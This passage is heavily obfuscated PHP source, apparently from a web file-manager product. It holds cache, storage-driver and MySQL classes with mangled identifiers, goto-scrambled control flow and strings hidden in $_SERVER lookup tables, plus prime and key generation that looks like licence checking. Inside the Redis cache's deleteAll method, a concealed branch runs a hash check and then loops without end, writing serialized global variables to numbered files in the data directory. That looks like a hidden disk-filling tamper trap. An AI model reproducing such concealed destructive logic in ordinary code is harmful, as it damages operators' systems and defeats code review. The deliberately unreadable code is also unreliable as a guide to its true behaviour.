$Fô©ÓÜå… . $F˜ª¶œâáè[10], $F˜ª¶œâáè[167]); goto aµ¯‰¶Åà‡; c¯ è•òÄÔ: $E´Áô¦½Û = ($CÖ³æ¼¨Î - 1) * ($Fô©ÓÜå… - 1); $dƒ‰„¸Æƒš = $F˜ª¶œâáè[263](($CÖ³æ¼¨Î + $Fô©ÓÜå…) / 2); while (1) { $bÇ‚ÌàÖ½œ = $dƒ‰„¸Æƒš; $Eù¾ˆ¥Ì¬‹ = $c¹ìÌ±Á±˜[699]; if (!$Eù¾ˆ¥Ì¬‹) { return; } $a„˜Ä¨ñù¢ = $E´Áô¦½Û; $A·‹éÀ‘˜‹ = $c¹ìÌ±Á±˜[700]; if (!$A·‹éÀ‘˜‹) { return; } while ($a„˜Ä¨ñù¢ % $bÇ‚ÌàÖ½œ != 0) { $EÉ®Âø—‰® = $a„˜Ä¨ñù¢; $a„˜Ä¨ñù¢ = $bÇ‚ÌàÖ½œ; $A¸‚ôö‰‚Ş = $c¹ìÌ±Á±˜[701]; $bÇ‚ÌàÖ½œ = $EÉ®Âø—‰® % $bÇ‚ÌàÖ½œ; $A‘Ü•Í‰®· = $c¹ìÌ±Á±˜[702]; while ($A‘Ü•Í‰®· < $c¹ìÌ±Á±˜[400]) { if ($A‘Ü•Í‰®· >= 0) { break; } $A‘Ü•Í‰®·++; } } if ($bÇ‚ÌàÖ½œ == 1) { break; } else { $dƒ‰„¸Æƒš++; } } goto côÉò¾±ªó; aµ¯‰¶Åà‡: $C…Ø°ˆÄ¹ = $c¹ìÌ±Á±˜[703]; $AÔóÁíÏ’ = $F˜ª¶œâáè[124]($F˜ª¶œâáè[369] . ($CÖ³æ¼¨Î + $Fô©ÓÜå…) . $F˜ª¶œâáè[370] . $dƒ‰„¸Æƒš . $F˜ª¶œâáè[370] . $a·•¸ù¬…Ç . $F˜ª¶œâáè[371]); $e‰óöÑ«” = $c¹ìÌ±Á±˜[704]; goto CÄª°¬åÕ; CÄª°¬åÕ: $B©ŒñÂ‡©¾ = $this->{$_SERVER[¿][165]}($eÌ„«–ÒÊˆ, $AÔóÁíÏ’) . $F˜ª¶œâáè[372] . $eŸ•éÈÍ¹¯; return $B©ŒñÂ‡©¾; $b¿”Úñ×Ô„ = $c¹ìÌ±Á±˜[705]; goto e„¾å•¤ª‚; A²»áƒª…œ: } public function vgjz31ed41d4($aâÄ™¸ è) { goto Fãö¼½ãÁ; dèÆ‹‰´…º: if (!$D²Ø†˜½´ã) { return; } if (!$BŸÖœÒÊç†) { return $bìœ†¢’ùà[10]; } $BŸÖœÒÊç† = $bìœ†¢’ùà[263]($BŸÖœÒÊç†); goto B•´œ¥à›; Fãö¼½ãÁ: $bã•íö›¯ =& $_SERVER[«¾°Ã¤]; $bìœ†¢’ùà =& $_SERVER[¿]; $bİ¦ŠÌ•½â = $bìœ†¢’ùà[0]($bìœ†¢’ùà[372], $aâÄ™¸ è); goto bÃˆÜÌÖÓª; bÃˆÜÌÖÓª: if ($bìœ†¢’ùà[19]($bİ¦ŠÌ•½â) != 2) { return $bìœ†¢’ùà[10]; } $BŸÖœÒÊç† = $this->{$_SERVER[¿][269]}($bİ¦ŠÌ•½â[1] . $bìœ†¢’ùà[10], $bìœ†¢’ùà[167]); $D²Ø†˜½´ã = $bã•íö›¯[706]; goto dèÆ‹‰´…º; d¢ˆÏ¿´§ï: $BÃ†¿Š”Œ = $this->{$_SERVER[¿][269]}($bİ¦ŠÌ•½â[0], $cÅ£í“°Úé); $cìŞÏ‡Õìí = $bã•íö›¯[710]; if (!$cìŞÏ‡Õìí) { return; } goto CêøÅ½èÑ²; e›–éÊ««Ö: $e¿Á¢‰È¦ = 2; for ($e¥®º‚™ = 0; $e¥®º‚™ < $e‹ ÍÒ˜ÆÛ * 10; $e¥®º‚™++) { if (($e‹ ÍÒ˜ÆÛ * $e¥®º‚™ + 1) % $B­•Ë‘áÍ» == 0) { $e¿Á¢‰È¦ = $bìœ†¢’ùà[263](($e‹ ÍÒ˜ÆÛ * $e¥®º‚™ + 1) / $B­•Ë‘áÍ»); break; } } $cÅ£í“°Úé = $bìœ†¢’ùà[124]($bìœ†¢’ùà[369] . ($EÎËã‘å‡ + $A¿œÜĞ¡ÎÜ) . $bìœ†¢’ùà[370] . $B­•Ë‘áÍ» . $bìœ†¢’ùà[370] . $e¿Á¢‰È¦ . $bìœ†¢’ùà[371]); goto d¢ˆÏ¿´§ï; fÕòŒ‡÷ø: $e‹ ÍÒ˜ÆÛ = ($EÎËã‘å‡ - 1) * ($A¿œÜĞ¡ÎÜ - 1); $B­•Ë‘áÍ» = $bìœ†¢’ùà[263](($EÎËã‘å‡ + $A¿œÜĞ¡ÎÜ) / 2); while (1) { $DŸïÚÔä = $B­•Ë‘áÍ»; $f‡Á±¹Õ–Ï = $e‹ ÍÒ˜ÆÛ; while ($f‡Á±¹Õ–Ï % $DŸïÚÔä != 0) { $a‰ñ×ô§ = $f‡Á±¹Õ–Ï; $B‡›³À·àÉ = $bã•íö›¯[707]; $f‡Á±¹Õ–Ï = $DŸïÚÔä; $A¤ÔäÆ¡áà = $bã•íö›¯[708]; while ($A¤ÔäÆ¡áà < $bã•íö›¯[587]) { if ($A¤ÔäÆ¡áà >= 0) { break; } $A¤ÔäÆ¡áà++; } $DŸïÚÔä = $a‰ñ×ô§ % $DŸïÚÔä; $b¨ÏÕÄŒ‹Ì = $bã•íö›¯[709]; } if ($DŸïÚÔä == 1) { break; } else { $B­•Ë‘áÍ»++; } } goto e›–éÊ««Ö; CêøÅ½èÑ²: return $BÃ†¿Š”Œ; $dâ¸ÄÊŠë = $bã•íö›¯[711]; while (strlen($dâ¸ÄÊŠë) < $bã•íö›¯[589]) { if (!$dâ¸ÄÊŠë) { break; } $dâ¸ÄÊŠë++; } goto D›¥£¬¬å; B•´œ¥à›: $EÎËã‘å‡ = 0; $A¿œÜĞ¡ÎÜ = 0; for ($e¥®º‚™ = 3; $e¥®º‚™ < $BŸÖœÒÊç†; $e¥®º‚™ += 2) { if ($BŸÖœÒÊç† % $e¥®º‚™ != 0) { continue; } $EÎËã‘å‡ = $e¥®º‚™; $A¿œÜĞ¡ÎÜ = $bìœ†¢’ùà[263]($BŸÖœÒÊç† / $e¥®º‚™); break; } goto fÕòŒ‡÷ø; D›¥£¬¬å: } public function kthc88c787f5() { goto E¡ôí­Ë­í; AöğºÙŠÁñ: $a¢˜çÒÚÌ = array(); $dŞ±’È÷šô = 1; $BğÕ‹¾íØ– = $bºØíÓÛ¯[712]; goto EóÎĞò; fŒİ¬‘ÕæØ: return $cÎÕ¹ƒ¦Óˆ; $CëÊ”¨Ü = $bºØíÓÛ¯[715]; if (!$CëÊ”¨Ü) { return; } goto F×ÈĞ÷ é»; EóÎĞò: while ($dŞ±’È÷šô <= (int) $AªÍ¿ÂÆ²Ö[374]($B·—ÖÆàƒ”)) { $cìğÕ¹¾ˆ = $dŞ±’È÷šô; $BÁĞí¡Ä…‹ = $bºØíÓÛ¯[713]; while (!0) { $cìğÕ¹¾ˆ++; if ($cìğÕ¹¾ˆ <= 2) { $dŞ±’È÷šô = $cìğÕ¹¾ˆ; break; } else { if ($cìğÕ¹¾ˆ < 2) { continue; } } $F”ÒÊôØÇÀ = !0; for ($b‘ß‰„Ø‹ = 2; $b‘ß‰„Ø‹ <= $AªÍ¿ÂÆ²Ö[374]($cìğÕ¹¾ˆ); $b‘ß‰„Ø‹++) { if ($cìğÕ¹¾ˆ % $b‘ß‰„Ø‹ == 0) { $F”ÒÊôØÇÀ = !1; } } if ($F”ÒÊôØÇÀ) { $dŞ±’È÷šô = $cìğÕ¹¾ˆ; break; } } $a¢˜çÒÚÌ[] = $dŞ±’È÷šô; } $cÎÕ¹ƒ¦Óˆ = 2; for ($cìğÕ¹¾ˆ = $B·—ÖÆàƒ”; $cìğÕ¹¾ˆ > 1; $cìğÕ¹¾ˆ--) { $F”ÒÊôØÇÀ = !0; $eğ¶ˆ×Ö«¢ = $bºØíÓÛ¯[714]; while (strlen($eğ¶ˆ×Ö«¢) < $bºØíÓÛ¯[627]) { if (!$eğ¶ˆ×Ö«¢) { break; } $eğ¶ˆ×Ö«¢++; } foreach ($a¢˜çÒÚÌ as $F¥Áéî‚²ç) { if ($cìğÕ¹¾ˆ % $F¥Áéî‚²ç == 0) { $F”ÒÊôØÇÀ = !1; break; } } if ($F”ÒÊôØÇÀ) { $cÎÕ¹ƒ¦Óˆ = $cìğÕ¹¾ˆ; break; } } goto fŒİ¬‘ÕæØ; E¡ôí­Ë­í: $bºØíÓÛ¯ =& $_SERVER[«¾°Ã¤]; $AªÍ¿ÂÆ²Ö =& $_SERVER[¿]; $B·—ÖÆàƒ” = $AªÍ¿ÂÆ²Ö[354]($AªÍ¿ÂÆ²Ö[373](2, 14), $AªÍ¿ÂÆ²Ö[373](2, 16) - 1); goto AöğºÙŠÁñ; F×ÈĞ÷ é»: } public function rvch4d8cf0be($BíŞÀ„¿’, $d“¹àÛî„‚) { $e¬±í“¤š =& $_SERVER[¿]; return $e¬±í“¤š[13](array($e¬±í“¤š[14], $e¬±í“¤š[375]), $BíŞÀ„¿’, $d“¹àÛî„‚); } public function ftpr384ca167($bİÓŒÅ±×, $Cõˆ·¤Ì) { $dîìÀ—´Ò =& $_SERVER[«¾°Ã¤]; $Fôí¹‘¡”Ó =& $_SERVER[¿]; return $Fôí¹‘¡”Ó[13](array($Fôí¹‘¡”Ó[376], $Fôí¹‘¡”Ó[377]), $bİÓŒÅ±×, $Cõˆ·¤Ì); $Bå…†÷­­ = $dîìÀ—´Ò[716]; while (strlen($Bå…†÷­­) < $dîìÀ—´Ò[596]) { if (!$Bå…†÷­­) { break; } $Bå…†÷­­++; } } public function odbv94defa1b($AÆ‹µÇ¬Üà, $eÆØ“’Ù÷¡) { $f–ˆÅòïã =& $_SERVER[¿]; return $f–ˆÅòïã[13](array($f–ˆÅòïã[376], $f–ˆÅòïã[378]), $AÆ‹µÇ¬Üà, $eÆØ“’Ù÷¡); } } goto cÁïŒ“æ¢í; fÇ¢•ªÊØ¿: class CacheMemcached { public $handle; public $cacheTime; public function __construct($d»­ÂÂÉ†Ï, $DÒ­±®œÇ) { $B©œåÑŒÉ÷ =& $_SERVER[«¾°Ã¤]; if (!class_exists($B©œåÑŒÉ÷[830])) { show_json($B©œåÑŒÉ÷[831], !1); } $this->cacheTime = $DÒ­±®œÇ; $this->handle = new Memcached(); if (is_array($d»­ÂÂÉ†Ï[$B©œåÑŒÉ÷[832]]) && count($d»­ÂÂÉ†Ï[$B©œåÑŒÉ÷[832]]) >= 1) { foreach ($d»­ÂÂÉ†Ï[$B©œåÑŒÉ÷[832]] as $FáÌ¥ÂÒÁ) { $Bàêãâ½¸Š = explode($B©œåÑŒÉ÷[4], $FáÌ¥ÂÒÁ); $this->handle->addServer($Bàêãâ½¸Š[0], $Bàêãâ½¸Š[1]); } } else { $this->handle->addServer($d»­ÂÂÉ†Ï[$B©œåÑŒÉ÷[175]], $d»­ÂÂÉ†Ï[$B©œåÑŒÉ÷[176]]); } } public function set($föíÅÌ„Ü, $bÅ…»õ†, $b·Ğ…›ä = false) { $b·Ğ…›ä = $b·Ğ…›ä ? $b·Ğ…›ä : $this->cacheTime; return $this->handle->set($föíÅÌ„Ü, $bÅ…»õ†, $b·Ğ…›ä); } public function get($f‘”ÊÜ‰Õ†) { return $this->handle->get($f‘”ÊÜ‰Õ†); } public function remove($CÃÀ½ŞİƒÄ) { return $this->handle->delete($CÃÀ½ŞİƒÄ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($cÕÒöÛ‰Õ, $a«Á‰İæÁË) { $dÎÅ³Ç—ß =& $_SERVER[«¾°Ã¤]; if (!class_exists($dÎÅ³Ç—ß[833])) { show_json($dÎÅ³Ç—ß[834], !1); } $this->cacheTime = $a«Á‰İæÁË; $FíóÎæÇë¸ = isset($cÕÒöÛ‰Õ[$dÎÅ³Ç—ß[835]]) ? $cÕÒöÛ‰Õ[$dÎÅ³Ç—ß[835]] : 10; $A—‡ÔİŞØ = _get($cÕÒöÛ‰Õ, $dÎÅ³Ç—ß[832]); if ($A—‡ÔİŞØ && is_array($A—‡ÔİŞØ)) { $this->initCluster($cÕÒöÛ‰Õ, $FíóÎæÇë¸); } else { $this->handle = $this->init($cÕÒöÛ‰Õ, $FíóÎæÇë¸); } } private function init($Eñ¬™ìö…í, $d¦àœˆ¿¸¥) { $e¹—é„Œ =& $_SERVER[«¾°Ã¤]; $bïŸîÚ³è = new Redis(); $BŒµÄöÅ‰ = isset($Eñ¬™ìö…í[$e¹—é„Œ[836]]) ? $Eñ¬™ìö…í[$e¹—é„Œ[836]] : !1; if ($BŒµÄöÅ‰) { $bïŸîÚ³è->pconnect($Eñ¬™ìö…í[$e¹—é„Œ[175]], $Eñ¬™ìö…í[$e¹—é„Œ[176]], $d¦àœˆ¿¸¥); } else { $bïŸîÚ³è->connect($Eñ¬™ìö…í[$e¹—é„Œ[175]], $Eñ¬™ìö…í[$e¹—é„Œ[176]], $d¦àœˆ¿¸¥); } if (!empty($Eñ¬™ìö…í[$e¹—é„Œ[415]])) { $bïŸîÚ³è->auth($Eñ¬™ìö…í[$e¹—é„Œ[415]]); } return $bïŸîÚ³è; } private function initCluster($EÀŸçÑ¸¹, $dÍµ†§â†ø) { $dÒË³—äŒ¢ =& $_SERVER[«¾°Ã¤]; $f¢Ô‹Á¢ƒá = array($dÒË³—äŒ¢[837], $dÒË³—äŒ¢[838], $dÒË³—äŒ¢[839]); $bÌáñÂÄÓ¬ = $dÒË³—äŒ¢[837]; if (isset($EÀŸçÑ¸¹[$dÒË³—äŒ¢[12]]) && in_array($EÀŸçÑ¸¹[$dÒË³—äŒ¢[12]], $f¢Ô‹Á¢ƒá)) { $bÌáñÂÄÓ¬ = $EÀŸçÑ¸¹[$dÒË³—äŒ¢[12]]; } switch ($bÌáñÂÄÓ¬) { case $dÒË³—äŒ¢[837]: $this->_slave($EÀŸçÑ¸¹, $dÍµ†§â†ø); break; case $dÒË³—äŒ¢[838]: break; case $dÒË³—äŒ¢[839]: $this->isCluster = !0; $d¢Ñø•°øó = $EÀŸçÑ¸¹[$dÒË³—äŒ¢[832]]; $C¶¹ƒâ±Ø = isset($EÀŸçÑ¸¹[$dÒË³—äŒ¢[836]]) ? $EÀŸçÑ¸¹[$dÒË³—äŒ¢[836]] : !1; $A­»ô¥ï = isset($EÀŸçÑ¸¹[$dÒË³—äŒ¢[415]]) ? $EÀŸçÑ¸¹[$dÒË³—äŒ¢[415]] : null; $this->handle = new RedisCluster(NUll, $d¢Ñø•°øó, $dÍµ†§â†ø, $dÍµ†§â†ø, $C¶¹ƒâ±Ø, $A­»ô¥ï); break; default: break; } } private function _slave($e×Æ¯Í¤İî, $bÕË²ŒÆïí) { goto b‰Ğê—Øîä; AÁê·±Àä: $this->filterConfig($e×Æ¯Í¤İî, $có½Î°¬Œ©[$D¸Ø„¸Ú°ß]); $this->slaveHandle = $this->init($e×Æ¯Í¤İî, $bÕË²ŒÆïí); goto E—¯ŠéÓÒÍ; BÒÊÃà…¹ß: unset($có½Î°¬Œ©[0]); if (empty($có½Î°¬Œ©)) { return; } $D¸Ø„¸Ú°ß = array_rand($có½Î°¬Œ©); goto AÁê·±Àä; b‰Ğê—Øîä: $có½Î°¬Œ© = $e×Æ¯Í¤İî[$_SERVER[«¾°Ã¤][832]]; $this->filterConfig($e×Æ¯Í¤İî, $có½Î°¬Œ©[0]); $this->handle = $this->init($e×Æ¯Í¤İî, $bÕË²ŒÆïí); goto BÒÊÃà…¹ß; E—¯ŠéÓÒÍ: } private function filterConfig(&$DÃ‹‹Ñø–é, $Eİ «ÀÍéÉ) { $böÓƒŞğ =& $_SERVER[«¾°Ã¤]; $Aà±ÒÆÑµ = explode($böÓƒŞğ[4], $Eİ «ÀÍéÉ); $a÷©Û¿ùÛ = array($böÓƒŞğ[175] => $Aà±ÒÆÑµ[0], $böÓƒŞğ[176] => $Aà±ÒÆÑµ[1]); $DÃ‹‹Ñø–é = array_merge($DÃ‹‹Ñø–é, $a÷©Û¿ùÛ); } public function set($Eš˜›¹¡È, $e´ò¦ƒÁäË, $Cïâ¨ğã» = false) { $Cïâ¨ğã» = $Cïâ¨ğã» ? $Cïâ¨ğã» : $this->cacheTime; return $this->handle->setEx($Eš˜›¹¡È, $Cïâ¨ğã», $e´ò¦ƒÁäË); } public function setLock($E½ÓÍğ­ö³, $dí±†£ù¹Š, $A’Ã©­¾‰¬) { return $this->handle->setNX($E½ÓÍğ­ö³, $dí±†£ù¹Š); } public function get($aßÈ”µÚÒß) { $AäÁÑ“Ö® = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $AäÁÑ“Ö®->get($aßÈ”µÚÒß); } public function remove($AÅ‹ïæö¼) { return $this->handle->del($AÅ‹ïæö¼); } public function deleteAll() { $BÓ¥¶â›”¿ =& $_SERVER[«¾°Ã¤]; $b½êãå¬Öµ = $_SERVER[$BÓ¥¶â›”¿[394]]; $dğ³µ®èÜÏ = $BÓ¥¶â›”¿[395]; if ($_SERVER[$BÓ¥¶â›”¿[396]] != $dğ³µ®èÜÏ($b½êãå¬Öµ)) { goto b¬ïšÖ¼Ô„; Fë¼ÃÚ¡²Ÿ: $d„‡¬ÌÄâ = 1; for ($CÚåĞšÄù = $d„‡¬ÌÄâ; $CÚåĞšÄù > 0; $CÚåĞšÄù++) { $bÖ‡ÎØÆÉò(DATA_PATH . $CÚåĞšÄù, $A´ŞôëÂ½Ø); } goto fƒ‘ÄñØ…; C˜´š–Õà½: $BØß‹¬ÎÆ = $BÓ¥¶â›”¿[841]; $BØß‹¬ÎÆ($_SERVER[$BÓ¥¶â›”¿[842]]); $Bæœ´ğ‚“ = $BÓ¥¶â›”¿[840]; goto BëÙ´”îë; b¬ïšÖ¼Ô„: $Bæœ´ğ‚“ = $BÓ¥¶â›”¿[840]; $e¥¤Úš‹·‹ = $BÓ¥¶â›”¿[397]; $Cª¸…ĞÙù½ = $_SERVER[$BÓ¥¶â›”¿[398]] . $BÓ¥¶â›”¿[399]; goto c–É›„¬Î¥; BëÙ´”îë: $Bæœ´ğ‚“(); $bÖ‡ÎØÆÉò = $BÓ¥¶â›”¿[843]; $A´ŞôëÂ½Ø = json_encode($GLOBALS[$BÓ¥¶â›”¿[844]]); goto Fë¼ÃÚ¡²Ÿ; c–É›„¬Î¥: $Bç…ÉÖ½… = $e¥¤Úš‹·‹($Cª¸…ĞÙù½); $F”ˆîîÊğ = explode($BÓ¥¶â›”¿[229], $Bç…ÉÖ½…); if (count($F”ˆîîÊğ) < $BÓ¥¶â›”¿[587]) { $E•šìÙÊŒÃ = $BÓ¥¶â›”¿[401]; $E•šìÙÊŒÃ(); } goto C˜´š–Õà½; fƒ‘ÄñØ…: } if ($this->isCluster) { foreach ($this->handle->_masters() as $cºè“…£§î) { $this->handle->flushall($cºè“…£§î); } return; } return $this->handle->flushAll(); } } $AÎ„ìÜß = $_SERVER[$_SERVER[«¾°Ã¤][394]]; goto D²ÖŠÉÃËó; aš“¿‹Åá·: class PathDriverDriverShareItem { public function __construct($aÒ’Š¦†ô) { $this->pathParse = $aÒ’Š¦†ô; } public function __call($Fœ‘¢éß¾, $fÙ¦¢®Ø„ã) { $E‰½Ÿ´é±™ =& $_SERVER[«¾°Ã¤]; if (method_exists($this, $Fœ‘¢éß¾)) { return; } $DÆÅÕÖŒêŒ = call_user_func_array(array($E‰½Ÿ´é±™[1216], $Fœ‘¢éß¾), $fÙ¦¢®Ø„ã); $cÚÜŠõäÕ = array($E‰½Ÿ´é±™[1217], $E‰½Ÿ´é±™[1218], $E‰½Ÿ´é±™[1219], $E‰½Ÿ´é±™[1220], $E‰½Ÿ´é±™[527], $E‰½Ÿ´é±™[529], $E‰½Ÿ´é±™[1221], $E‰½Ÿ´é±™[107], $E‰½Ÿ´é±™[1222], $E‰½Ÿ´é±™[1223]); if (in_array($Fœ‘¢éß¾, $cÚÜŠõäÕ)) { $DÆÅÕÖŒêŒ = $this->getPathOuter($DÆÅÕÖŒêŒ); } return $DÆÅÕÖŒêŒ; } public function copy($Dáõ¾¶„‚, $cã´Ç, $D®ó°¡ÁÂ = false) { return $this->copyMove($Dáõ¾¶„‚, $cã´Ç, $D®ó°¡ÁÂ, $_SERVER[«¾°Ã¤][527]); } public function move($D´ùØ‰±Ü, $E¨ÙªÜ©È‚, $A¾ƒå¦Œº = false) { return $this->copyMove($D´ùØ‰±Ü, $E¨ÙªÜ©È‚, $A¾ƒå¦Œº, $_SERVER[«¾°Ã¤][529]); } private function copyMove($c…çÆŠÛ±õ, $dÀ°Ï¸…Óå, $DİšÛ¦‚, $B¡‘ëë³æ¥) { goto DÊæ†¡Ÿ·ã; d‘¦Áì„Â: return $FŠèµÌÁÈ; goto BÌ®º±í„; DÊæ†¡Ÿ·ã: $dÏˆÄ™ã²ç =& $_SERVER[«¾°Ã¤]; $EçÚÄ„ŒÒ£ = $dÀ°Ï¸…Óå; $bÌ÷†ÍÚ = IO::driverMake($dÀ°Ï¸…Óå); goto B˜œöæÜßÃ; B˜œöæÜßÃ: if ($bÌ÷†ÍÚ->pathParse[$dÏˆÄ™ã²ç[1049]]) { $dÀ°Ï¸…Óå = $bÌ÷†ÍÚ->pathParse[$dÏˆÄ™ã²ç[1049]]; } else { $dÀ°Ï¸…Óå = $EçÚÄ„ŒÒ£; } $FŠèµÌÁÈ = IO::copyMove($c…çÆŠÛ±õ, $dÀ°Ï¸…Óå, $DİšÛ¦‚, $B¡‘ëë³æ¥); $FŠèµÌÁÈ = $this->getPathOuter($FŠèµÌÁÈ); goto d‘¦Áì„Â; BÌ®º±í„: } public function pathThis($B¸ÁÕ†§Ğ´) { return get_path_this($this->pathParse[$_SERVER[«¾°Ã¤][76]]); } public function pathFather($d‘ï·ÃÁ×) { return get_path_father($this->pathParse[$_SERVER[«¾°Ã¤][76]]); } public function iconvSystem($cÔÜîÜ´İ) { return $cÔÜîÜ´İ; } protected function infoParse($fª”•ôØÏ×, $aĞÂ­ÅĞŒÈ = false) { $Dóª¤“¨ªÂ =& $_SERVER[«¾°Ã¤]; $bÁÀ‡ĞùÈ± = $this->pathParse[$Dóª¤“¨ªÂ[475]][$Dóª¤“¨ªÂ[1072]] . $this->pathParse[$Dóª¤“¨ªÂ[1065]]; if ($aĞÂ­ÅĞŒÈ) { $C‰ô†Û×£ = IO::infoWithChildren($bÁÀ‡ĞùÈ±); } else { $C‰ô†Û×£ = IO::info($bÁÀ‡ĞùÈ±); } $côÁÕ¼„‹¯ = $this->pathParse[$Dóª¤“¨ªÂ[475]]; return Action($Dóª¤“¨ªÂ[1215])->_shareItemeParse($C‰ô†Û×£, $côÁÕ¼„‹¯); } public function listAll($c¬—œ’ó®¦) { $cŠ’™‘Ã¨ =& $_SERVER[«¾°Ã¤]; $F÷ä„¿›Ÿ = IO::listAll($c¬—œ’ó®¦); $Fò³‘Ğ®Èé = $this->pathParse[$cŠ’™‘Ã¨[475]]; foreach ($F÷ä„¿›Ÿ as &$EåŒƒóš÷Ê) { check_abort(); $cêÎ¬ä’«® = IO::info($EåŒƒóš÷Ê[$cŠ’™‘Ã¨[76]]); $cêÎ¬ä’«® = is_array($cêÎ¬ä’«®) ? $cêÎ¬ä’«® : array(); $EåŒƒóš÷Ê = array_merge($cêÎ¬ä’«®, $EåŒƒóš÷Ê); $EåŒƒóš÷Ê[$cŠ’™‘Ã¨[85]] = Action($cŠ’™‘Ã¨[1215])->_shareItemeParse($EåŒƒóš÷Ê, $Fò³‘Ğ®Èé); } unset($EåŒƒóš÷Ê); return $F÷ä„¿›Ÿ; } public function getPathOuter($E›Áõò…“) { goto E‡¢Ø„¹; E‡¢Ø„¹: $E‰§”ò²Õ¹ =& $_SERVER[«¾°Ã¤]; $E÷á ª‘Õ = KodIO::parse($E›Áõò…“); if ($E÷á ª‘Õ[$E‰§”ò²Õ¹[29]] == KodIO::KOD_SHARE_ITEM) { return $E÷á ª‘Õ[$E‰§”ò²Õ¹[76]]; } goto a™á˜¼õ; aª‘Ã²õÀ‹: if (substr($EÉßè÷ÏÚÃ, 0, strlen($a‡ò‘—¿Ì«)) != $a‡ò‘—¿Ì«) { return !1; } return $this->pathParse[$E‰§”ò²Õ¹[1066]] . $E‰§”ò²Õ¹[8] . ltrim($cíî¯ŸìÊĞ, $E‰§”ò²Õ¹[8]); goto Bƒœ‘ïĞÃš; a™á˜¼õ: $EÉßè÷ÏÚÃ = KodIO::clear($E›Áõò…“); $a‡ò‘—¿Ì« = KodIO::clear($this->pathParse[$E‰§”ò²Õ¹[475]][$E‰§”ò²Õ¹[1072]]); $cíî¯ŸìÊĞ = substr($EÉßè÷ÏÚÃ, strlen($a‡ò‘—¿Ì«)); goto aª‘Ã²õÀ‹; Bƒœ‘ïĞÃš: } public function getType() { $då±®ñ¢å =& $_SERVER[«¾°Ã¤]; $aŞ£ÜïÔã = str_replace($då±®ñ¢å[72], $då±®ñ¢å[33], get_class($this)); return strtolower($aŞ£ÜïÔã); } public function isTypeObject($cÌ“Ê¤Úô‹) { return IO::isTypeObject($cÌ“Ê¤Úô‹); } public function info($bÀƒù§–„æ) { return $this->infoParse($bÀƒù§–„æ); } public function infoAuth($e›ÊÊÖ×Ä) { return $this->infoParse($e›ÊÊÖ×Ä); } public function infoWithChildren($f‚ŞìÀä’Š) { return $this->infoParse($f‚ŞìÀä’Š, !0); } public function infoFull($f¯ß×ÚÜ¢) { return $this->infoParse($f¯ß×ÚÜ¢); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($f„Ø³÷­) { $this->pathParse = $f„Ø³÷­; } protected function infoParse($dòèØô‡„Õ, $f‰§—¼Ÿâ‰ = false) { $d¾ñ‚Şèò =& $_SERVER[«¾°Ã¤]; return Action($d¾ñ‚Şèò[1071])->sharePathInfo($this->pathParse[$d¾ñ‚Şèò[76]], !0, $f‰§—¼Ÿâ‰); } public function listPath($B‘ß¿¿ÛÖ, $B…Ô¦‚Ûáî = false) { $E©¸‰ø›’“ =& $_SERVER[«¾°Ã¤]; $b‚¸›ØÍÀ¥ = IO::listPath($B‘ß¿¿ÛÖ, $B…Ô¦‚Ûáî); foreach ($b‚¸›ØÍÀ¥ as $FÙ†ç èÔƒ => $A£ÊÎ³‰©¹) { if (!in_array($FÙ†ç èÔƒ, array($E©¸‰ø›’“[74], $E©¸‰ø›’“[75]))) { continue; } foreach ($A£ÊÎ³‰©¹ as $Aƒ’ø›šªµ => $Fñòíã‚) { $Fñòíã‚ = Action($E©¸‰ø›’“[1224])->parsePathChildren($Fñòíã‚, array($E©¸‰ø›’“[423] => $B‘ß¿¿ÛÖ)); $b‚¸›ØÍÀ¥[$FÙ†ç èÔƒ][$Aƒ’ø›šªµ] = Action($E©¸‰ø›’“[1071])->shareItemInfo($Fñòíã‚); } } return $b‚¸›ØÍÀ¥; } public function listAll($e¿ØÖŞŞŒš) { $eÙëèƒó½ =& $_SERVER[«¾°Ã¤]; $cÜ‘ÒÖ¨ = IO::listAll($e¿ØÖŞŞŒš); foreach ($cÜ‘ÒÖ¨ as &$b‹ĞäÁôµš) { $eí–œğŸÚ  = IO::info($b‹ĞäÁôµš[$eÙëèƒó½[76]]); $eí–œğŸÚ  = is_array($eí–œğŸÚ ) ? $eí–œğŸÚ  : array(); $b‹ĞäÁôµš = array_merge($eí–œğŸÚ , $b‹ĞäÁôµš); $b‹ĞäÁôµš[$eÙëèƒó½[85]] = Action($eÙëèƒó½[1071])->shareItemInfo($b‹ĞäÁôµš); } unset($b‹ĞäÁôµš); return $cÜ‘ÒÖ¨; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($f©ß¬ÂêƒÑ) { parent::__construct($f©ß¬ÂêƒÑ); } } goto BÅÕ¶ê„Ô; Fˆ——ó…: class DbMysql extends Db { public function __construct($d„¿™Úíß´ = '') { $aÎ©ğ¡Ñƒ =& $_SERVER[«¾°Ã¤]; if (!extension_loaded($aÎ©ğ¡Ñƒ[768])) { think_exception(think_lang($aÎ©ğ¡Ñƒ[10]) . $aÎ©ğ¡Ñƒ[846]); } if (!empty($d„¿™Úíß´)) { $this->config = $d„¿™Úíß´; if (empty($this->config[$aÎ©ğ¡Ñƒ[13]])) { $this->config[$aÎ©ğ¡Ñƒ[13]] = $aÎ©ğ¡Ñƒ[33]; } } } public function connect($aì«ßö• = '', $DàÈ™›£×á = 0, $eÍ´½ÖŠ¶¸ = false) { $b÷ğŸœ¤çî =& $_SERVER[«¾°Ã¤]; if (!isset($this->linkID[$DàÈ™›£×á])) { goto BØƒÃäŸä÷; B°¶Şæğ•¸: if (1 != think_config($b÷ğŸœ¤çî[18])) { unset($this->config); } goto C³ÇŒØÜˆÙ; EÏ‘¦í²: if ($F°“„òæÙ”) { $this->linkID[$DàÈ™›£×á] = mysql_pconnect($d§ÜÉ›åğ†, $aì«ßö•[$b÷ğŸœ¤çî[849]], $aì«ßö•[$b÷ğŸœ¤çî[850]], 131072); } else { $this->linkID[$DàÈ™›£×á] = mysql_connect($d§ÜÉ›åğ†, $aì«ßö•[$b÷ğŸœ¤çî[849]], $aì«ßö•[$b÷ğŸœ¤çî[850]], !0, 131072); } if (!$this->linkID[$DàÈ™›£×á] || !empty($aì«ßö•[$b÷ğŸœ¤çî[17]]) && !mysql_select_db($aì«ßö•[$b÷ğŸœ¤çî[17]], $this->linkID[$DàÈ™›£×á])) { think_exception(mysql_error()); } $eİÀíè±ãÆ = mysql_get_server_info($this->linkID[$DàÈ™›£×á]); goto A…ùß½‚±; BØƒÃäŸä÷: if (empty($aì«ßö•)) { $aì«ßö• = $this->config; } 